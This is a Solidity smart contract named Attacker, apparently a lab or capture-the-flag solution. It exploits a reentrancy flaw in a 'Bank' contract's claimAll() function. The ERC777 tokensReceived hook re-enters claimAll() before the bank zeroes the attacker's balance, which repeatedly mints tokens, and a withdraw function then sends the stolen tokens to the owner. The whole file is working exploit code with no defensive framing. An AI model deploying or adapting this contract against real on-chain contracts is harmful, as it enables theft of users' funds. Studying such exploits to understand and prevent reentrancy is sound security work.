// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC777/IERC777Recipient.sol";
import "@openzeppelin/contracts/token/ERC777/IERC777.sol";
import "@openzeppelin/contracts/interfaces/IERC1820Registry.sol";

/**
 * @title IBank
 * @dev Interface for the vulnerable Bank contract.
 */
interface IBank {
    function deposit() external payable;
    function claimAll() external;
    function token() external view returns (IERC777);
    function balances(address) external view returns (uint256);
}

/**
 * @title Attacker
 * @dev This contract exploits a reentrancy vulnerability in the Bank contract.
 */
contract Attacker is IERC777Recipient {
    address public owner;
    IBank public bank;
    IERC777 public token;
    
    IERC1820Registry private constant _ERC1820_REGISTRY = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);
    bytes32 private constant TOKENS_RECIPIENT_INTERFACE_HASH = keccak256("ERC777TokensRecipient");

    constructor(address _owner) {
        owner = _owner;
        // Register this contract as an ERC777TokensRecipient
        _ERC1820_REGISTRY.setInterfaceImplementer(address(this), TOKENS_RECIPIENT_INTERFACE_HASH, address(this));
    }

    /**
     * @dev Sets the address of the vulnerable Bank contract.
     */
    function setTarget(address _target) public {
        require(msg.sender == owner, "Only owner can set target");
        bank = IBank(_target);
        token = bank.token();
    }

    /**
     * @dev Executes the attack.
     */
    function attack(uint256 amt) payable public {
        // Deposit ETH into the bank
        bank.deposit{value: msg.value}();
        
        // Call the vulnerable claimAll() function to start the reentrancy attack
        bank.claimAll();
    }

    /**
     * @dev ERC777 hook called when tokens are received.
     * This is where the reentrancy attack happens.
     */
    function tokensReceived(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external override {
        // Only accept our target bank's token
        if (msg.sender != address(token)) {
            revert("Invalid token");
        }
        
        // Only re-enter if the sender is the bank (minting tokens)
        if (from != address(bank)) {
            return;
        }
        
        // Re-enter if our balance in the bank is still positive
        // This works because claimAll() sets balances[msg.sender] = 0 AFTER minting
        if (bank.balances(address(this)) > 0) {
            bank.claimAll();
        }
    }

    /**
     * @dev Withdraws all stolen ERC777 tokens to the specified address.
     */
    function withdraw(address to) public {
        require(msg.sender == owner, "Only owner can withdraw");
        uint256 balance = token.balanceOf(address(this));
        require(balance > 0, "No tokens to withdraw");
        token.send(to, balance, "");
    }

    // Allow contract to receive ETH
    receive() external payable {}
}